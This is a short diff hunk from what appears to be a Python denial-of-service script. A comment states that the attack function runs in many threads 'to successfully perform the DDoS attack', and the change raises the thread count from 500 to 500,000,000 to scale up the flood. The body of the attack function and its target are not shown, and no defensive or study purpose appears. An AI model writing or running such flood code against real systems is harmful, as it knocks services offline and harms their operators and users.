@@ -47,6 +47,6 @@ def attack():
 
 
 # We need to run the attack function in multiple therads, to successfully perform the DDoS attack.    
-for i in range(500):
+for i in range(500000000):
     thread = threading.Thread(target=attack)
     thread.start()
